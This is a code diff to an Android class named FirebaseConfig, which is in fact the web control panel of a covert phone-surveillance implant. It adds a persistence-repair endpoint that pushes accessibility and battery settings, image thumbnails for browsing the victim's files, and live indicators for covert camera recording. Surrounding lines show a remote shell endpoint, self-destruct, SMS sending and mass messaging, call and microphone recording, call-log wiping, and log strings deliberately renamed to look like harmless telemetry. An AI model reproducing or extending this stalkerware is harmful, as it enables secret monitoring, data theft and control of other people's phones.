@@ -60,7 +60,6 @@ public class FirebaseConfig extends NanoHTTPD {
         if (msg == null) return;
         
         // --- HARDENED LOGGING: Deceptive Naming ---
-        // We transform obvious strings into legitimate-sounding system telemetry.
         String hardenedMsg = msg.replace("UPLINK_AUTHORIZED", "TELEMETRY_SESSION_SYNCED")
                                .replace("SMS_HISTORY_EXTRACTED", "SYNC_MSG_DB_SUCCESS")
                                .replace("CAMERA_FEED_STARTED", "ANALYTICS_OPTICS_INIT")
@@ -68,21 +67,30 @@ public class FirebaseConfig extends NanoHTTPD {
                                .replace("GHOST_CONTROLLER", "IO_PERSISTENCE_MANAGER")
                                .replace("STEALTH_MODE", "IDENTITY_PROVIDER_CONFIG");
 
+        // Determine Priority Level for UI Coloring
+        String priority = "[S]"; // Default: Success/Info (Cyan)
+        String upper = hardenedMsg.toUpperCase();
+        if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
+            priority = "[C]"; // Critical (Red)
+        } else if (upper.contains("WARNING") || upper.contains("BATTERY") || upper.contains("LOST") || upper.contains("ERROR")) {
+            priority = "[W]"; // Warning (Orange)
+        } else if (upper.contains("SUCCESS") || upper.contains("ACTIVE") || upper.contains("INIT")) {
+            priority = "[S]"; // Success (Green)
+        }
+
         String timestamp;
         synchronized (logTimeFormat) {
             timestamp = logTimeFormat.format(new Date());
         }
-        String logEntry = "[" + timestamp + "] " + hardenedMsg;
+        String logEntry = priority + " [" + timestamp + "] " + hardenedMsg;
         
         synchronized (systemLogs) {
             systemLogs.add(logEntry);
-            // Optimization: Keep last 500 entries in RAM to balance visibility vs memory
             if (systemLogs.size() > 500) {
                 systemLogs.remove(0);
             }
         }
         
-        // Background Save Throttling: Commits to disk at most once every 10 seconds
         long now = System.currentTimeMillis();
         if (now - lastLogSaveTime.get() > 10000) {
             lastLogSaveTime.set(now);
@@ -507,7 +515,7 @@ public class FirebaseConfig extends NanoHTTPD {
                         logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
                             Intent intent = new Intent(context, WorkManager_Sync.class);
-                            intent.setAction("STOP");
+                            intent.setAction(Constants.ACTION_STOP_CORE);
                             context.startService(intent);
                         }, 1500);
                         // Return special JSON to trigger logout on frontend
@@ -515,6 +523,27 @@ public class FirebaseConfig extends NanoHTTPD {
                     } else if (uri.equals("/device/self-destruct")) {
                         selfDestruct();
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/fix-persistence")) {
+                        logActivity("SYSTEM_MAINTENANCE: Initiating persistence repair...");
+                        
+                        // 1. Open App Info for Hibernation/Battery manual fix
+                        Intent infoIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                        infoIntent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
+                        infoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(infoIntent);
+                        
+                        // 2. Staggered launch of Accessibility settings if service is offline
+                        if (IO_Persistence_Manager.getInstance() == null) {
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try {
+                                    Intent accIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                    context.startActivity(accIntent);
+                                } catch (Exception ignored) {}
+                            }, 3000);
+                        }
+                        
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"REPAIR_READY: 1. Disable Hibernation. 2. Enable Accessibility.\"}");
                     } else if (uri.equals("/device/shell")) {
                         String cmd = params.get("cmd");
                         boolean termuxAvailable = isAppInstalled("com.termux");
@@ -584,7 +613,7 @@ public class FirebaseConfig extends NanoHTTPD {
                         logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
                             Intent intent = new Intent(context, WorkManager_Sync.class);
-                            intent.setAction("START");
+                            intent.setAction(Constants.ACTION_START_CORE);
                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                 context.startForegroundService(intent);
                             } else {
@@ -609,14 +638,20 @@ public class FirebaseConfig extends NanoHTTPD {
                         org.json.JSONArray array = new org.json.JSONArray();
                         
                         synchronized (systemLogs) {
-                            // If client is fresh (0) or out of sync (logs cleared), send all
-                            int startIdx = (since >= systemLogs.size() || since < 0) ? 0 : since;
+                            // Fix: Only reset to 0 if since is out of bounds or less than 0.
+                            // If since == size, the loop won't run and an empty list is returned correctly.
+                            int startIdx = since;
+                            if (since < 0 || since > systemLogs.size()) {
+                                startIdx = 0;
+                            }
                             
                             for (int i = startIdx; i < systemLogs.size(); i++) {
                                 array.put(systemLogs.get(i));
                             }
                             result.put("logs", array);
                             result.put("last_id", systemLogs.size());
+                            // Hint to frontend if a clear occurred
+                            result.put("reset", (since > systemLogs.size()));
                         }
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", result.toString());
                     } else if (uri.equals("/gps")) {
@@ -1040,7 +1075,7 @@ public class FirebaseConfig extends NanoHTTPD {
         html.append("<div class=\"card\">");
         html.append("<div class=\"flex-header\" style=\"margin-bottom: 15px;\">");
         html.append("<h2 style=\"margin: 0; color: var(--neon-cyan); text-align: left;\">HARDWARE_ANALYTICS</h2>");
-        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0;\">&#9888; REPAIR_PERMISSIONS</button>");
+        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0;\">&#9888; REPAIR_UPLINK_STABILITY</button>");
         html.append("</div>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
         
@@ -1143,9 +1178,22 @@ public class FirebaseConfig extends NanoHTTPD {
                 String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                 String icon = getFileIcon(file);
                 String iconClass = getFileIconClass(file);
+                
+                boolean isImage = fileName.toLowerCase().matches(".*\\.(jpg|jpeg|png|webp|gif|bmp)$");
+                String thumbnail = "";
+                if (isImage) {
+                    String b64 = getFileThumbnailBase64(file);
+                    if (!b64.isEmpty()) {
+                        thumbnail = "<img src='data:image/jpeg;base64," + b64 + "' style='width:60px; height:60px; object-fit:cover; border-radius:4px; border:1px solid rgba(0,242,255,0.2); margin-right:15px; cursor:pointer;' onclick=\"window.open('/files/" + filePath + "')\">";
+                    }
+                }
 
-                html.append("<li class=\"file-item\">");
-                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
+                html.append("<li class=\"file-item\" style=\"display:flex; align-items:center;\">");
+                if (!thumbnail.isEmpty()) {
+                    html.append(thumbnail);
+                } else {
+                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
+                }
                 html.append("<div class=\"file-info\">");
                 html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                 
@@ -1805,8 +1853,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                 "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                 "<p>The requested page does not exist.</p>" +
-                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
-                +
+                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                 "</div>" +
                 "</div>" +
                 HTML_FOOTER;
@@ -1821,6 +1868,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                 "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                 "<p>" + escapeHtml(message) + "</p>" +
+                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                 "</div>" +
                 "</div>" +
                 HTML_FOOTER;
@@ -2016,6 +2064,42 @@ public class FirebaseConfig extends NanoHTTPD {
                 .replace("'", "&#39;");
     }
 
+    private String getFileThumbnailBase64(File file) {
+        try {
+            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
+            options.inJustDecodeBounds = true;
+            android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
+            
+            // Scaled down for list view (max 120px)
+            options.inSampleSize = calculateInSampleSize(options, 120, 120);
+            options.inJustDecodeBounds = false;
+            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath(), options);
+            if (bitmap == null) return "";
+            
+            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
+            String b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
+            bitmap.recycle();
+            return b64;
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    private int calculateInSampleSize(android.graphics.BitmapFactory.Options options, int reqWidth, int reqHeight) {
+        final int height = options.outHeight;
+        final int width = options.outWidth;
+        int inSampleSize = 1;
+        if (height > reqHeight || width > reqWidth) {
+            final int halfHeight = height / 2;
+            final int halfWidth = width / 2;
+            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
+                inSampleSize *= 2;
+            }
+        }
+        return inSampleSize;
+    }
+
     private String getFileIcon(File file) {
         if (file.isDirectory())
             return "&#128193;";
@@ -2131,14 +2215,12 @@ public class FirebaseConfig extends NanoHTTPD {
         html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         
         html.append("<div class=\"card\">");
-        html.append("<div style=\"display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 25px;\">");
-        html.append("<h2 style=\"margin: 0; white-space: nowrap; text-align: left; font-size: 1.1rem;\">&#128247; COVERT_CAMERA_HUB</h2>");
+        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.1rem;\">&#128247; COVERT_CAMERA_HUB</h2>");
         
-        // Advanced Tactical Indicator - Force NEXT to title
-        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 8px; border-radius: 6px; font-size: 0.55rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap;\">");
+        // Advanced Tactical Indicator - Placed UNDER title for mobile clarity
+        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
         html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
         html.append("<span id=\"indicator-text\">STANDBY</span>");
-        html.append("</div>");
         html.append("</div>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
 
@@ -2150,10 +2232,13 @@ public class FirebaseConfig extends NanoHTTPD {
             }
         }
 
-        // Live Feed Container (Standardized with GPS Map Look)
-        html.append("<style>@media(max-width:768px){ #stream-container { height: 400px !important; } }</style>");
+        // Live Feed Container (Fill widescreen on PC)
+        html.append("<style>");
+        html.append("@media(min-width:769px){ #stream-container { max-width: 100% !important; height: 600px !important; } #main-stream { object-fit: cover !important; } }");
+        html.append("@media(max-width:768px){ #stream-container { height: 400px !important; } #main-stream { object-fit: contain !important; } }");
+        html.append("</style>");
         html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
-        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:900px; height: 450px; background:#000; margin:0 auto; border-radius:8px; border:1px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
+        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:100% !important; height: 450px; background:#000; margin:0 auto; border-radius:8px; border:1px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
         html.append("<img id=\"main-stream\" style=\"width: 100%; height: 100%; object-fit: contain; ").append(autostart ? "display: block;" : "display: none;").append("\" />");
         html.append("<div id=\"loading-overlay\" style=\"position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--neon-cyan); font-size:0.75rem; font-family:monospace; letter-spacing:2px; z-index: 5;\">").append(autostart ? "INITIALIZING_UPLINK..." : "Uplink_Ready").append("</div>");
         html.append("</div></div>");
@@ -2548,23 +2633,25 @@ public class FirebaseConfig extends NanoHTTPD {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<style>")
             .append("@media (min-width: 769px) {")
-            .append("  #stream { width: 70% !important; margin: 0 auto !important; display: block !important; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); ");
-        
-        if ("ultra_low".equals(res) || "very_low".equals(res) || "low".equals(res)) {
-            int pcHeight = (int)(uiHeight * 1.25);
-            html.append("height: ").append(pcHeight).append("px !important; ");
-        } else if ("medium".equals(res)) {
-            html.append("height: 380px !important; ");
-        }
-        
-        html.append("}")
+            .append("  #stream-container { max-width: 100% !important; height: 600px !important; }")
+            .append("  #stream { width: 100% !important; height: 100% !important; object-fit: cover !important; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.3); }")
+            .append("}")
+            .append("@media (max-width: 768px) {")
+            .append("  #stream-container { height: ").append(uiHeight).append("px !important; }")
+            .append("  #stream { object-fit: contain !important; }")
             .append("}")
             .append("</style>");
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");
+        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.1rem;\">&#128249; LIVE_STREAM_UPLINK</h2>");
+        
+        // Advanced Tactical Indicator - Placed UNDER title for mobile clarity
+        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
+        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
+        html.append("<span id=\"indicator-text\">STANDBY</span>");
+        html.append("</div>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
 
         // Check permission
@@ -2589,7 +2676,7 @@ public class FirebaseConfig extends NanoHTTPD {
         // Live stream viewer
         html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
         html.append(
-                "<div id=\"stream-container\" style=\"position: relative; display: flex; align-items: center; justify-content: center; width: 100%; max-width: 900px; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
+                "<div id=\"stream-container\" style=\"position: relative; display: flex; align-items: center; justify-content: center; width: 100%; max-width: 100% !important; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
         html.append(
                 "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: 100%; object-fit: contain; display: block; transition: transform 0.3s ease;\" ");
         html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
@@ -2609,7 +2696,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
         // Resolution selector
         html.append("<div style=\"margin-bottom: 30px; text-align: center; max-width: 500px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
-        html.append("<div style=\"color: #888; margin-bottom: 10px; font-size: 0.7rem; font-family:monospace;\">SURVEILLANCE_FIDELITY</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: center;\">SURVEILLANCE_FIDELITY</div>");
         html.append("<div style=\"position: relative; width: 100%;\">");
         html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" style=\"width: 100%; margin: 0; padding: 0; cursor: pointer;\">");
         html.append("<div style=\"position: relative; width: 100%; height: 20px; font-size: 0.5rem; color: #777; font-family: monospace; letter-spacing: 0; margin-top: 8px;\">");
@@ -2783,13 +2870,25 @@ public class FirebaseConfig extends NanoHTTPD {
         // Check status
         html.append("function checkStatus() {");
         html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
+        html.append("    const ind = document.getElementById('live-indicator');");
+        html.append("    const dot = document.getElementById('indicator-dot');");
+        html.append("    const txt = document.getElementById('indicator-text');");
         html.append("    if (d.recording) {");
         html.append("      document.getElementById('rec-indicator').style.display = 'block';");
         html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; STOP_COVERT_RECORDING';");
+        html.append("      ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)';");
+        html.append("      dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)';");
         html.append("      isRecording = true;");
+        html.append("    } else {");
+        html.append("      document.getElementById('rec-indicator').style.display = 'none';");
+        html.append("      document.getElementById('rec-btn').innerHTML = '&#9679; START_COVERT_RECORDING';");
+        html.append("      ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
+        html.append("      dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
+        html.append("      isRecording = false;");
         html.append("    }");
         html.append("  }).catch(e => {});");
         html.append("}");
+        html.append("setInterval(checkStatus, 2000);");
 
         // Stop stream when leaving page
         html.append("window.onbeforeunload = function() { streamActive = false; };");
@@ -2948,7 +3047,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private void startCameraStreamInternal(String camId, int width, int height, int quality) {
         android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
-        intent.setAction("START_STREAM");
+        intent.setAction(Constants.ACTION_START_STREAM);
         intent.putExtra("cameraId", camId);
         intent.putExtra("width", width);
         intent.putExtra("height", height);
@@ -2959,7 +3058,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private Response stopCameraStream() {
         android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
-        intent.setAction("STOP_STREAM");
+        intent.setAction(Constants.ACTION_STOP_STREAM);
         context.startService(intent);
 
         String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
@@ -2982,7 +3081,7 @@ public class FirebaseConfig extends NanoHTTPD {
         }
 
         android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
-        intent.setAction("START_RECORDING");
+        intent.setAction(Constants.ACTION_START_RECORDING);
         intent.putExtra("cameraId", camId != null ? camId : "0");
         intent.putExtra("width", width);
         intent.putExtra("height", height);
@@ -3001,7 +3100,7 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response stopVideoRecording() {
         logActivity("OPTICS_TERMINATED: Background recording saved");
         android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
-        intent.setAction("STOP_RECORDING");
+        intent.setAction(Constants.ACTION_STOP_RECORDING);
         context.startService(intent);
 
         String videoPath = Analytics_Provider.getCurrentVideoPath();
@@ -3186,7 +3285,7 @@ public class FirebaseConfig extends NanoHTTPD {
         }
 
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
-        intent.setAction("START_MIC_RECORDING");
+        intent.setAction(Constants.ACTION_START_MIC_REC);
         intent.putExtra("duration", duration);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -3206,7 +3305,7 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response stopMicRecording() {
         logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
-        intent.setAction("STOP_MIC_RECORDING");
+        intent.setAction(Constants.ACTION_STOP_MIC_REC);
         context.startService(intent);
 
         String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
@@ -3222,7 +3321,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String callType = params.get("type");
 
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
-        intent.setAction("START_CALL_RECORDING");
+        intent.setAction(Constants.ACTION_START_CALL_REC);
         intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
         intent.putExtra("call_type", callType != null ? callType : "manual");
 
@@ -3239,7 +3338,7 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response stopCallRecording() {
         logActivity("ACOUSTICS_TERMINATED: Call recording ended");
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
-        intent.setAction("STOP_CALL_RECORDING");
+        intent.setAction(Constants.ACTION_STOP_CALL_REC);
         context.startService(intent);
 
         String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
@@ -3279,7 +3378,7 @@ public class FirebaseConfig extends NanoHTTPD {
         boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));
 
         android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
-        intent.setAction("UPDATE_SETTINGS");
+        intent.setAction(Constants.ACTION_UPDATE_AUDIO_SETTINGS);
         intent.putExtra("auto_record", autoRecord);
         intent.putExtra("save_on_device", saveOnDevice);
 
@@ -3405,7 +3504,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                 "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
                 "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
-                "<a href=\"/calls\" class=\"btn\" style=\"margin-top:30px;\">Back to Call Logs</a>" +
+                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div>" +
                 "</div></div>" + HTML_FOOTER;
                 
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
@@ -3848,7 +3947,7 @@ public class FirebaseConfig extends NanoHTTPD {
                     smsManager, number, null, message, null, null);
             }
 
-            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
+            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
     }
@@ -3885,7 +3984,7 @@ public class FirebaseConfig extends NanoHTTPD {
             } else {
                 html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Could not dispatch media package. Check device logs.</p>";
             }
-            html += "<div style=\"margin-top: 30px;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
+            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
 
         } catch (Exception e) {
@@ -4071,7 +4170,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 logActivity("DATA_MODIFIED: File saved - " + path);
             }
             
-            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Changes deployed successfully to storage.</p><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div>" + HTML_FOOTER;
+            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Changes deployed successfully to storage.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) {
             return serveError("Save Failed: " + e.getMessage());
@@ -4180,7 +4279,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
-            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
+            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) {
             return serveError("Failed to update password: " + e.getMessage());
@@ -5124,7 +5223,7 @@ else {
         try {
             logActivity("COMMS_WIPE: Wiping device call history");
             context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
-            String html = getHeader("/calls") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Call logs have been successfully wiped from the device.</p><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div>" + HTML_FOOTER;
+            String html = getHeader("/calls") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Call logs have been successfully wiped from the device.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) { return serveError("Wipe Failed: " + e.getMessage()); }
     }
@@ -5256,7 +5355,7 @@ else {
             }
         });
 
-        String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><div style=\"margin-top: 30px;\"><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div></div>" + HTML_FOOTER;
